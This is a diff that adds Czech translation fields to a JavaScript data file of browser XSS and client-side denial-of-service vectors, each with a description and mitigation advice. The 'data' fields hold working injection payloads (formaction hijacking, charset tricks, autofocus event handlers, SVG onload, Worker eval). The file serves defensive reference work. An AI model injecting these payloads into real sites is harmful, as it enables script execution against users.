@@ -8,6 +8,7 @@ var items =
             'en' : 'XSS via formaction - requiring user interaction (1)',
             'ja' : 'formaction\u7d4c\u7531\u3067\u306eXSS - \u30e6\u30fc\u30b6\u306e\u4ecb\u5728\u304c\u5fc5\u8981',
             'ru' : 'Пассивный скриптинг через formaction (1)',
+            'cs' : 'XSS pomocí formaction - vyžaduje uživatelskou interakci (1)',
             'de' : ''
         },
         'data'       : '<form id="test" /><button form="test" formaction="%js_uri_alert%">X',
@@ -15,6 +16,7 @@ var items =
             'en' : 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
             'ja' : 'HTML5\u306eform\u3068formaction\u6a5f\u80fd\u3092\u4f7f\u3063\u3066\u65e2\u5b58\u306eform\u3092\u5916\u5074\u304b\u3089\u4e57\u3063\u53d6\u308b\u624b\u6cd5',
             'ru' : 'Вектор демонстрирует возможности HTML 5 атрибутов form и formaction по захвату внешней формы.',
+            'cs' : 'Ukázka možností zneužití form a formaction k převzetí kontroly z místa mimo formulář',
             'de' : ''
         },
         'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction'],
@@ -22,6 +24,7 @@ var items =
             'en' : 'Don\'t allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes. Avoid "id" attributes for forms as well as submit buttons.',
 	    'ja' : '\u0022form\u0022\u3068\u0022formaction\u0022\u5c5e\u6027\u3092\u542b\u3080\u8981\u7d20\u3092\u30e6\u30fc\u30b6\u306b\u5165\u529b\u3055\u305b\u306a\u3044\u3001\u3042\u308b\u3044\u306f\u305d\u308c\u3089\u306e\u5c5e\u6027\u3092\u7121\u52b9\u306a\u5024\u306b\u5909\u63db\u3059\u308b\u3053\u3068\u3002\u0022id\u0022\u5c5e\u6027\u306fform\u3060\u3051\u3067\u306a\u304fsubmit\u30dc\u30bf\u30f3\u306b\u3064\u3044\u3066\u3082\u5bfe\u5fdc\u3059\u308b\u3053\u3068\u3002',
             'ru' : 'Не разрешайте пользовательскую разметку, содержащую атрибуты form и formaction или неправильные значения этих атрибутов. Избегайте атрибут id в формах, как и элементы ввода submit типа.',
+            'cs' : 'Nedovolte uživatelům vložit kód obsahující atributy "form" a "formaction" či jejich "zkomolené" tvary. Vyhněte se atributu "id" u formulářů i u odesílacích tlačítek.',
             'de' : ''
         },
         'browsers'   : {
@@ -38,6 +41,7 @@ var items =
             'en' : 'XSS via x-imap4-modified-utf7 (1)',
             'ja' : 'x-imap4-modified-utf7\u3092\u5229\u7528\u3057\u305fXSS (1)',
             'ru' : 'XSS с использованием x-imap4-modified-utf7 (1)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_1%',
@@ -45,6 +49,7 @@ var items =
             'en' : 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
             'ja' : '\u3053\u306e\u653b\u6483\u624b\u6cd5\u306f\u3001\u691c\u51fa\u304c\u975e\u5e38\u306b\u56f0\u96e3\u306a\u3001\u98a8\u5909\u308f\u308a\u306acharset\u306b\u3088\u308bXSS\u306e\u624b\u6bb5\u3068\u306a\u308a\u5f97\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u307e\u3059\u3002',
             'ru' : 'Этот вектор показывает, как ответвление кодировки UTF7 может быть использовано для создания очень труднообнаружимых XSS векторов.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -52,6 +57,7 @@ var items =
             'en' : 'Make sure no <META> tags can be injected and the website is delivered with a charset.',
             'ja' : '\u653b\u6483\u8005\u306b\u3088\u308b\u003cmeta\u003e\u8981\u7d20\u306e\u633f\u5165\u304c\u4e0d\u53ef\u80fd\u306a\u3053\u3068\u3001web\u30b5\u30a4\u30c8\u304ccharset\u3092\u6b63\u3057\u304f\u9001\u51fa\u3057\u3066\u3044\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3002',
             'ru' : 'Убедитесь, что тег <META> не может быть внедрен и страницы сайта отправляются с указанием кодировки.',
+            'cs' : '',
             'de' : ''
         },
         'browsers'   : {
@@ -69,6 +75,7 @@ var items =
             'en' : 'XSS via x-imap4-modified-utf7 (2)',
             'ja' : 'x-imap4-modified-utf7\u3092\u5229\u7528\u3057\u305fXSS (2)',
             'ru' : 'XSS с использованием x-imap4-modified-utf7 (2)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_2%',
@@ -76,6 +83,7 @@ var items =
             'en' : 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
             'ja' : '\u3053\u306e\u653b\u6483\u624b\u6cd5\u306f\u3001\u691c\u51fa\u304c\u975e\u5e38\u306b\u56f0\u96e3\u306a\u3001\u98a8\u5909\u308f\u308a\u306acharset\u306b\u3088\u308bXSS\u306e\u624b\u6bb5\u3068\u306a\u308a\u5f97\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u307e\u3059\u3002',
             'ru' : 'Этот вектор показывает, как ответвление кодировки UTF7 может быть использовано для создания очень труднообнаружимых XSS векторов.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -83,6 +91,7 @@ var items =
             'en' : 'Make sure no <META> tags can be injected and the website is delivered with a charset.',
             'ja' : '\u653b\u6483\u8005\u306b\u3088\u308b\u003cmeta\u003e\u8981\u7d20\u306e\u633f\u5165\u304c\u4e0d\u53ef\u80fd\u306a\u3053\u3068\u3001web\u30b5\u30a4\u30c8\u304ccharset\u3092\u6b63\u3057\u304f\u9001\u51fa\u3057\u3066\u3044\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3002',
             'ru' : 'Убедитесь, что тег <META> не может быть внедрен и страницы сайта отправляются с указанием кодировки.',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -100,6 +109,7 @@ var items =
             'en' : 'Self-including DOM Worker XSS',
             'ja' : '',
             'ru' : 'Скриптинг в DOM с помощью объекта Worker.',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
@@ -107,6 +117,7 @@ var items =
             'en' : 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
             'ja' : '\u30b9\u30af\u30ea\u30d7\u30c8\u306e\u5b9f\u884c\u306b DOM workers \u3068 message \u30a4\u30d9\u30f3\u30c8\u3092\u5229\u7528\u3057\u305f\u3001\u81ea\u8eab\u3092 include \u3059\u308b\u30b3\u30fc\u30c9',
             'ru' : 'Исполнение кода происходит благодаря отсылке javascript-сообщения методом postMessage и приёму его на той же странице объектом Worker, к обработчику события onmessage которого привязана функция, запускающая метод eval.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/En/Using_web_workers'],
@@ -114,6 +125,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -131,6 +143,7 @@ var items =
             'en' : 'Firefox crypto object - hidden eval()',
             'ja' : 'Firefox crypto \u30aa\u30d6\u30b8\u30a7\u30af\u30c8 - \u96a0\u308c\u305f eval()',
             'ru' : 'Объект crypto в Firefox - скрытый eval()',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script>crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')</script>',
@@ -138,6 +151,7 @@ var items =
             'en' : 'This vector uncovers a hidden eval() inside the Firefox crypto object',
             'ja' : 'Firefox crypto \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u5185\u306b\u96a0\u3055\u308c\u305f eval\u0028\u0029 \u6a5f\u80fd\u3067\u3059\u3002',
             'ru' : 'Этот вектор срывает покровы с объекта crypto в Firefox, выявляя внутри него скрытый eval().',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/JavaScript_crypto'],
@@ -145,6 +159,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -162,6 +177,7 @@ var items =
             'en' : 'Firefox setter based JavaScript execution',
             'ja' : 'Firefox\u306esetter\u306b\u3088\u308bJavaScript\u306e\u5b9f\u884c',
             'ru' : 'Исполнение кода в Firefox с использованием setter',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script>({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%</script>',
@@ -169,6 +185,7 @@ var items =
             'en' : 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
             'ja' : 'Gecko\u002fFirefox\u306esetter\u306b\u3088\u308b\u62ec\u5f27\u3092\u4f7f\u308f\u306a\u3044JavaScript\u306e\u5b9f\u884c',
             'ru' : 'Применение setter`ов в Gecko/Firefox для выполнения JavaScript без использования круглых скобок.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters'],
@@ -176,6 +193,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -193,6 +211,7 @@ var items =
             'en' : 'Self-executing focus event via autofocus',
             'ja' : 'autofocus\u306b\u3088\u308bfocus\u30a4\u30d9\u30f3\u30c8\u3092\u5229\u7528\u3057\u305f\u81ea\u5df1\u5b9f\u884c',
             'ru' : 'Автофокусировка как способ автоматического исполнения кода',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<input onfocus=%js_write% autofocus>',
@@ -200,6 +219,7 @@ var items =
             'en' : 'This vector uses an input element with autofocus to call its own focus event handler - no user interaction required',
             'ja' : 'autofocus \u5c5e\u6027\u3092\u6301\u3064 input \u8981\u7d20\u3092\u4f7f\u3063\u3066\u81ea\u8eab\u306efocus\u30a4\u30d9\u30f3\u30c8\u306e\u30cf\u30f3\u30c9\u30e9\u3092\u547c\u3073\u51fa\u3059\u624b\u6cd5\u3002\u30e6\u30fc\u30b6\u306e\u4ecb\u5728\u306f\u4e0d\u8981\u3002',
             'ru' : 'Этот вектор использует тег input с атрибутом autofocus, чтобы вызвать свой собственный обработчик события фокусировки без взаимодействия с пользователем.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602','http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control'],
@@ -207,6 +227,7 @@ var items =
             'en' : 'User submitted markup should not contain "autofocus" attributes.', 
 	    'ja' : '\u30e6\u30fc\u30b6\u306e\u5165\u529b\u3057\u305fHTML\u65ad\u7247\u306b \u0022autofocus\u0022 \u5c5e\u6027\u304c\u542b\u307e\u308c\u306a\u3044\u3088\u3046\u306b\u3059\u308b\u3053\u3068\u3002',
             'ru' : 'Пользовательская разметка не должна содержать атрибут autofocus.',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -225,6 +246,7 @@ var items =
             'en' : 'Self-executing blur event via autofocus competition',
             'ja' : 'blur\u30a4\u30d9\u30f3\u30c8\u306b\u3088\u308bautofocus\u306e\u596a\u3044\u5408\u3044\u306b\u3088\u308b\u81ea\u5df1\u5b9f\u884c',
             'ru' : 'Потеря фокуса, инициированная фокусировкой на другом теге, как способ автоматического исполнения кода.',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<input onblur=%js_write% autofocus><input autofocus>',
@@ -232,6 +254,7 @@ var items =
             'en' : 'Here we have two HTML input elements competing for the focus - and one executing JavaScript on losing its focus',
             'ja' : '\u30d5\u30a9\u30fc\u30ab\u30b9\u3092\u596a\u3044\u5408\u30462\u3064\u306einput\u8981\u7d20\u304c\u3042\u308a\u3001\u4e00\u65b9\u304c\u30d5\u30a9\u30fc\u30ab\u30b9\u3092\u5931\u3063\u305f\u5834\u5408\u306bJavaScript\u304c\u5b9f\u884c\u3055\u308c\u308b\u3002',
             'ru' : 'В этом примере мы видим два тега input, конкурирующих за фокус, и один из них исполняет JavaScript при потере им фокуса.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602','http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control'],
@@ -239,6 +262,7 @@ var items =
             'en' : 'User submitted markup should not contain "autofocus" attributes.',
             'ja' : '\u30e6\u30fc\u30b6\u306e\u5165\u529b\u3057\u305fHTML\u65ad\u7247\u306b \u0022autofocus\u0022 \u5c5e\u6027\u304c\u542b\u307e\u308c\u306a\u3044\u3088\u3046\u306b\u3059\u308b\u3053\u3068\u3002',
             'ru' : 'Пользовательская разметка не должна содержать атрибут autofocus.',
+            'cs' : '',
             'de' : ''
         },    
         'browsers'   : {
@@ -258,6 +282,7 @@ var items =
             'en' : 'Opera link-source JavaScript execution via CSS',
             'ja' : 'CSS\u7d4c\u7531\u306eOpera link\u30bd\u30fc\u30b9\u306b\u3088\u308bJavaScript\u306e\u5b9f\u884c',
             'ru' : 'Исполнение JavaScript в Opera с помощью CSS-свойства link-source',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
@@ -265,6 +290,7 @@ var items =
             'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript',
             'ja' : 'Opera\u306f\u4efb\u610f\u306eHTML\u8981\u7d20\u306b\u3001\u30af\u30ea\u30c3\u30af\u3057\u3066\u5b9f\u884c\u3067\u304d\u308bJavaScript\u3092\u542b\u3081\u308b\u3053\u3068\u306e\u3067\u304d\u308blink\u30bd\u30fc\u30b9\u306e\u8a2d\u5b9a\u3092\u8a31\u3057\u3066\u3044\u308b\u3002',
             'ru' : 'Opera позволяет устанавливать ссылки для любых HTML-тегов, делать их интерактивными и пригодными для внедрения JavaScript.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html'],
@@ -272,6 +298,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -289,6 +316,7 @@ var items =
             'en' : 'JavaScript execution via <VIDEO> poster attribute',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью атрибута poster тега <VIDEO>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<video poster=%js_uri_alert%//',
@@ -296,6 +324,7 @@ var items =
             'en' : 'Opera 10.5+ allows using poster attrubtes in combination with javascript: URIs',
             'ja' : '',
             'ru' : 'Opera 10.5+ поддерживает атрибут poster в сочетании с псевдоскриптом.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -303,6 +332,7 @@ var items =
             'en' : 'Make sure only relative URIs, http URIs and correctly MIME-typed data URIs can be used for VIDEO poster attribuites',
             'ja' : '',
             'ru' : 'Убедитесь, что для атрибута poster допускаются только относительные URI, http URI и правильные MIME типы для data:URI .',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -318,6 +348,7 @@ var items =
             'en' : 'SVG executing JavaScript via <G> tag and onload attribute',
             'ja' : '',
             'ru' : 'Исполнение JavaScript в SVG с помощью элемента <G> и атрибута onload',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><g onload="%js_uri_alert%"></g></svg>',
@@ -325,6 +356,7 @@ var items =
             'en' : 'SVG files can execute JavaScript via onload events on any element without user interaction',
             'ja' : '',
             'ru' : 'SVG-файлы могут исполнять JavaScript с помощью обработчиков onload в любых элементах без взаимодействия с пользователем.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/SVG'],
@@ -332,6 +364,7 @@ var items =
             'en' : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements',
             'ja' : '',
             'ru' : 'SVG-файлы не должны рассматриваться в качестве изображений - особенно, когда дело касается загрузки. SVG-файл может содержать произвольные данные HTML, а также обработчики событий в собственных элементах.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -349,6 +382,7 @@ var items =
             'en' : 'Self-executing JavaScript via <BODY> onscroll autofocus',
             'ja' : '',
             'ru' : 'Самовыполнение JavaScript с помощью обрабочкика onscroll тега <BODY> и autofocus',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<body onscroll=%js_alert%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
@@ -356,6 +390,7 @@ var items =
             'en' : 'This vector triggers an onscroll event executing JavaScript on <BODY> due to an autofocus on an <INPUT> way further down the page.',
             'ja' : '',
             'ru' : 'В этом векторе исполнение JavaScript достигается путем искусственного вызова события scroll (прокрутка страницы) тега <BODY>, происходящем из-за автофокусировки на теге <INPUT> в конце страницы.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
@@ -363,6 +398,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -381,6 +417,7 @@ var items =
             'en' : 'Client-side denial of service via repeat templates',
             'ja' : '',
             'ru' : 'Отказ в обслуживании со стороны клиента с помощью повторяющихся шаблонов',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
@@ -388,6 +425,7 @@ var items =
             'en' : 'This vector uses the repeat template syntax specifies in the WebForms 2.0 draft. By using nested tags repeating themselves all over again the client can be forced to deny service or even crash.',
             'ja' : '',
             'ru' : 'Этот вектор использует синтаксис повторящихся шаблонов, определенный в черновике WebForms 2.0. При использовании вложенных тегов повторения могут провоцировать отказ в обслуживании или даже аварийное завершение работы клиента.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.whatwg.org/specs/web-forms/current-work/#repeatingFormControls'],
@@ -395,6 +433,7 @@ var items =
             'en' : 'Avoid allowing users submitting HTML containing repeat or "repeat-start"/"repeat-end" attributes. If necessary validate the numerical values used for them to be reasonably small.',
             'ja' : '',
             'ru' : 'Не разрешайте пользовательскую HTML-разметку , содержащую атрибуты repeat или repeat-start/repeat-end. При необходимости проверяйте, чтобы используемые в них численные значения были относительно невелики.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -410,6 +449,7 @@ var items =
             'en' : 'Client-side denial of service via faulty regular expressions',
             'ja' : '',
             'ru' : 'Отказ в обслуживании со стороны клиента с помощью неправильного регулярного выражения',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
@@ -417,6 +457,7 @@ var items =
             'en' : 'Opera 10 allows client side validation via the pattern attribute. In case the pattern value is a badly written regex the client can be "dossed" with short customized character sequences.',
             'ja' : '',
             'ru' : 'Opera 10 поддерживает проверку правильности пользовательского ввода с помощью атрибута pattern. В случае, если параметр pattern является ошибочно написанным регулярным выражением, это может вызвать отказ в обслуживании с клиентской стороны.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/#the-pattern-attribute', 'http://en.wikipedia.org/wiki/Regular_expression_Denial_of_Service_-_ReDoS'],
@@ -424,6 +465,7 @@ var items =
             'en' : 'Don\'t allow users to submit HTML containing "pattern" attributes and make sure your own client side regular expressions used for validation are well written and not vulnerable against easy ReDoS attacks.',
             'ja' : '',
             'ru' : 'Не разрешайте пользовательскую HTML-разметку , содержащую атрибут pattern и убедитесь, что ваши собственные клиентские регулярные выражения корректно написаны и неуязвимы для ReDoS атак.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -439,6 +481,7 @@ var items =
             'en' : 'JavaScript execution via sharp variables',
             'ja' : '',
             'ru' : 'Выполнение JavaScript с помощью диез-переменных',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script>({0:#0=%js_alert_only%/#0#/#0#(0)})</script>',
@@ -446,6 +489,7 @@ var items =
             'en' : 'This vector demonstrates how sharp variables and cyclic references can be used for obfuscation to hide the actual method execution.',
             'ja' : '',
             'ru' : 'Этот вектор демонстрирует использование диез-переменных (sharp variables) и циклических ссылок для обфускации фактического вызова метода.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/Sharp_variables_in_JavaScript'],
@@ -453,6 +497,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -468,6 +513,7 @@ var items =
             'en' : 'Using onbegin and HTML+TIME to execute JavaScript',
             'ja' : '',
             'ru' : 'Использование onbegin и HTML+TIME для вызова JavaScript',
+            'cs' : '',
             'de' : ''
         },
         'data'       : 'X<x style=`behavior:url(#default#time2)` onbegin=`%js_write%` >',
@@ -475,6 +521,7 @@ var items =
             'en' : 'The HTML+TIME behavior allows to use arbitrary tags to execute JavaScript via onbegin event handlers.',
             'ja' : '',
             'ru' : 'Поведение HTML+TIME позволяет достичь исполнения JavaScript в произвольном теге с помощью обработчика события onbegin.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
@@ -482,6 +529,7 @@ var items =
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',
             'ja' : '',
             'ru' : 'Не позволяйте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки в отношении опасных HTML-тегов. Достаточно нераспространенные HTML+TIME API предоставляют слишком много экзотических способов исполнения JavaScript без взаимодействия с пользователем. Избегайте черных списков, если это возможно.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -497,6 +545,7 @@ var items =
             'en' : 'Opera XML-stylesheets executing JavaScript',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью XML-таблицы стилей в Opera ',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet href="%js_uri_alert%"?>',
@@ -504,6 +553,7 @@ var items =
             'en' : 'Opera 9.x and 10.0 allow to apply XML-stylesheets with JavaScript URIs and executes the JavaScript afterwards without user interaction. The vectors even works if the page is delivered as text/html.',
             'ja' : '',
             'ru' : 'Opera 9.x и 10,0 позволяет применять XML-таблицы стилей с псевдоскриптом, который в дальнейшем выполняется без взаимодействия с пользователем. Вектор работает, даже если страница отправляется как text/html.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -511,6 +561,7 @@ var items =
             'en' : 'Make sure that user input cannot contain XML stylesheets or tags not consisting of <\\w+ - because this vector would only be matched via <\\?\\w+ but still executes JavaScript without user interaction. Avoid blacklists is possible.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательская разметка не может содержать XML-таблицы и теги, не состоящие из <\\w+ - потому что этот вектор будет соответствовать только <\\?\\w+ . Избегайте черных списков, если это возможно.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -526,6 +577,7 @@ var items =
             'en' : 'Entities inside <SCRIPT> and comparable tags',
             'ja' : '',
             'ru' : 'HTML-эквиваленты внутри <SCRIPT> и аналогичных тегов',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert_entities%</script>',
@@ -533,6 +585,7 @@ var items =
             'en' : 'By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and rendered as X(HT)ML.',
             'ja' : '',
             'ru' : 'Согласно спецификации пользовательским агентам разрешено распознавать HTML-эквиваленты внутри тегов <SCRIPT> и <STYLE> в случае, если документ отдается и обрабатывается как X(HT)ML.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -540,6 +593,7 @@ var items =
             'en' : 'Make sure filters and detection systems consider the fact of having entities to be allowed inbetween <SCRIPT>, <STYLE> and other tags - and not only in attributes.',
             'ja' : '',
             'ru' : 'Убедитесь, что фильтры и системы обнаружения учитывают возможность наличия HTML-эквивалентов внутри тегов <SCRIPT>, <STYLE> и других, а не только в атрибутах.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -557,6 +611,7 @@ var items =
             'en' : 'XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew',
             'ja' : '',
             'ru' : 'XSS c использованием &#188 and &#190 в кодировках MacFarsi, MacArabic and MacHebrew',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<meta charset="mac-farsi">\xBCscript\xBE%js_alert%\xBC/script\xBE',
@@ -564,6 +619,7 @@ var items =
             'en' : 'By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and redered as X(HT)ML',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -571,6 +627,7 @@ var items =
             'en' : 'User input should never allow <META> tags to avoid re-setting the charset. In case the website is encoded in one of the affected charsets make sure to have your filter be aware that for Firefox &#60; (<) and &#188; are equivalent - as well as other characters too.',
             'ja' : '',
             'ru' : 'Пользовательскому вводу никогда не должен быть разрешен тег <МЕТА> во избежание переопределения кодировки. В случае, если веб-сайт кодируется в одной из указанных кодировок, убедитесь, что вашему фильтру известно, что для Firefox символы &#60; (<) и &#188; эквивалентны, аналогично и в отношении других сиволов.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -586,6 +643,7 @@ var items =
             'en' : 'JavaScript execution via overwritten ReferenceError object',
             'ja' : '',
             'ru' : 'Исполнение JavaScript через переопределение объекта ReferenceError',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script>ReferenceError.prototype.__defineGetter__(\'name\', function(){%js_alert%}),x</script>',
@@ -593,6 +651,7 @@ var items =
             'en' : 'This JavaScript vector shows how overwriting the ReferenceError object and causing the exact same kind of error afterwards can lead to JavaScript execution. This is of course the same for most other error objects and should be taken into consideration when implementing JavaScript sandboxes or comparable.',
             'ja' : '',
             'ru' : 'Этот JavaScript-вектор показывает, как переопределяя объект ReferenceError и вызывая такого же рода ошибку впоследствии, можно вызвать выполнение JavaScript. Это, разумеется, действительно для большинства других объектов ошибкок и должнo приниматься во внимание при разработке JavaScript-песочниц и т.п.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Functions/ReferenceError'],
@@ -600,6 +659,7 @@ var items =
             'en' : 'Do not trust the DOM in case the user can influence it via script injections, includes or other DOM based property access.',
             'ja' : '',
             'ru' : 'Не доверяйте DOM в случае, если пользователь может повлиять на неё через инъекции, включения JavaScript или другой доступ к свойствам, основанный на DOM.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -618,6 +678,7 @@ var items =
             'en' : 'JavaScript execution via proprietary __noSuchMethod__',
             'ja' : '',
             'ru' : 'Выполнение JavaScript с помощью нестандарного свойства __noSuchMethod__',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'%js_alert%\')()</script>',
@@ -625,6 +686,7 @@ var items =
             'en' : 'Firefox supports the non-standard __noSuchMethod__ property which will be used as an interceptor as soon as a non existing object method is being called. It can be assigned with the Function object to force JavaScript execution without using function(){...}.',
             'ja' : '',
             'ru' : 'Firefox поддерживает нестандартное свойство __noSuchMethod__ , которое может использоваться в качестве перехватчика, когда вызывается несуществующий объект. В качестве такового может быть назначен объект Function, чтобы инициировать исполнение JavaScript без использовавания function(){...} .',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/noSuchMethod'],
@@ -632,6 +694,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },          
         'browsers'   : {
@@ -647,6 +710,7 @@ var items =
             'en' : 'Input stealing/form DoS with onblur=focus() and autofocus',
             'ja' : '',
             'ru' : 'Перехват ввода/DoS формы посредством onblur=focus() и autofocus',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<input onblur=%js_focus% autofocus><input>',
@@ -654,6 +718,7 @@ var items =
             'en' : 'This very basic vector demonstrates how the combination of "autofocus" and "onblur" can render any other form on the targeted website useless.',
             'ja' : '',
             'ru' : 'Этот очень простой вектор показывает, как сочетание autofocus и onblur может сделать любую другую форму на целевом сайте бесполезной.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
@@ -661,6 +726,7 @@ var items =
             'en' : 'User submitted markup should not contain "autofocus" attributes.',
             'ja' : '',
             'ru' : 'Пользовательская разметка не должна содержать атрибут autofocus.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -678,6 +744,7 @@ var items =
             'en' : 'Form surveillance with onformchange, onforminput and form attributes',
             'ja' : '',
             'ru' : 'Наблюдение за формой с помощью атрибутов onformchange, onforminput и form',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<form id=test onforminput=%js_alert%><input></form><button form=test onformchange=%js_alert_2%>X',
@@ -685,6 +752,7 @@ var items =
             'en' : 'Enter a value into the form element to see how "onforminput" and "onformchange" attributes can monitor <FORM> activity - even from outside the <FORM> via the form attribute on a <BUTTON> element.',
